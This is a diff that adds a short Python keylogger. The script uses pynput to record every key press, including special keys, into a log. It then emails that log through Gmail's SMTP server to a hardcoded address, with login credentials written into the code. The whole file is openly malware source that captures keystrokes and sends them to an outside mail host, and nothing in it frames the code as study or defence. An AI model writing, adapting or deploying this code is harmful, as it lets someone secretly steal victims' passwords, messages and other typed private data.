@@ -1,0 +1,31 @@
+import pynput
+import smtplib
+
+# Set up the email server
+server = smtplib.SMTP('smtp.gmail.com', 587)
+server.starttls()
+server.login("mlimpayr810@gmail.com", "password")
+
+# This is the email address that the keylogger logs will be sent to
+recipient = "mlimpayr810@gmail.com"
+
+# This is the log that will store all of the key press events
+log = ""
+
+# This function will be called every time a key is pressed
+def on_press(key):
+    global log
+    try:
+        # Append the key to the log
+        log += key.char
+    except AttributeError:
+        # If the key doesn't have a character (e.g. Ctrl, Alt), append the key's name to the log
+        log += key.name
+
+# Set up the keyboard listener
+with pynput.keyboard.Listener(on_press=on_press) as listener:
+    listener.join()
+
+# Send the log through email
+server.sendmail(recipient, recipient, log)
+server.quit()
